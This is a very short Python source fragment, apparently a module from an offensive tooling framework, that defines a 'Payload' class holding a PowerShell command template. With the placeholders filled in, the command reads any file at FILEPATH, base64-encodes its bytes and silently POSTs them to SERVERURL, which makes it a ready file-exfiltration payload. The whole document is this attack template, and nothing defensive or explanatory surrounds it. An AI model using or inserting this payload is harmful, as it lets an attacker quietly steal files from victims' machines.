class Payload:
    template = 'Invoke-WebRequest -Uri SERVERURL -Method POST -Body ([System.Convert]::ToBase64String([System.IO.File]::ReadAllBytes("FILEPATH"))) | Out-Null'